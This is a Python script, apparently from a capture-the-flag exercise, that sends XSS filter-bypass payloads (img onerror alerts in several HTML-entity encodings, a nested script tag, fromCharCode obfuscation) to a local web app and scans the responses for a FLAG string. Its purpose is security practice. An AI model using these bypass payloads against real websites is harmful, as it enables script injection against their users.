import requests
import urllib.parse
import re
import json

base_url = "http://127.0.0.1:33204"
endpoint = "/page"

payload = "&lt;img src=x onerror=alert('XSS')&gt;"

print("=" * 70)
print("XSS Filter Bypass - Flag Extraction Attempt")
print("=" * 70)
print()
print(f"Payload: {payload}")
print()

encoded = urllib.parse.quote(payload, safe='')
url = f"{base_url}{endpoint}?name={encoded}"

response = requests.get(url, timeout=10)

print("Full Response:")
print("-" * 70)
print(response.text)
print("-" * 70)
print()

# Check for any flag pattern in the response
flag_pattern = r'FLAG\{[^}]+\}'
flags = re.findall(flag_pattern, response.text)

if flags:
    print("[!] FLAG(S) FOUND:")
    for flag in flags:
        print(f"    {flag}")
else:
    print("No flags in initial response. Checking for indication of XSS success...")
    
    # The form shows "Failed! Try again!" which suggests we need to find the correct payload
    # Let me check if there are multiple testing endpoints or if we need to find a specific sequence
    
    if "Failed!" in response.text or "error" in response.text.lower():
        print("[-] Current vector shows as failed")
        print("[?] May need different payload or test additional vectors")

print()

# Let's also test other entity variations to be thorough
additional_tests = [
    ("Decimal entities", "&#60;img src=x onerror=alert('XSS')&#62;"),
    ("Hex entities (lowercase)", "&#x3C;img src=x onerror=alert('XSS')&#x3E;"),
    ("Hex entities (uppercase)", "&#x3c;img src=x onerror=alert('XSS')&#x3e;"),
    ("Nested mixed", "&lt;img src=x onerror=alert('XSS')&gt;<script>alert('XSS')</script>"),
    ("Single quote variant", "&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;"),
]

print("Testing additional entity variations:")
print("=" * 70)
print()

for name, test_payload in additional_tests:
    print(f"Testing: {name}")
    print(f"Payload: {test_payload}")
    
    encoded_test = urllib.parse.quote(test_payload, safe='')
    test_url = f"{base_url}{endpoint}?name={encoded_test}"
    
    resp = requests.get(test_url, timeout=10)
    
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    # Check for flags
    test_flags = re.findall(flag_pattern, resp.text)
    if test_flags:
        print(f"[!] FLAG FOUND: {test_flags}")
    
    # Check for success indicators
    if "success" in resp.text.lower():
        print("[✓] Success indicator found")
    elif "failed" in resp.text.lower() or "error" in resp.text.lower():
        print("[-] Failed/error indicator")
    
    # Show reflection
    if test_payload in resp.text:
        print("[✓] Payload reflected in response")
    
    print()
    print("-" * 70)
    print()

print("Testing completed")
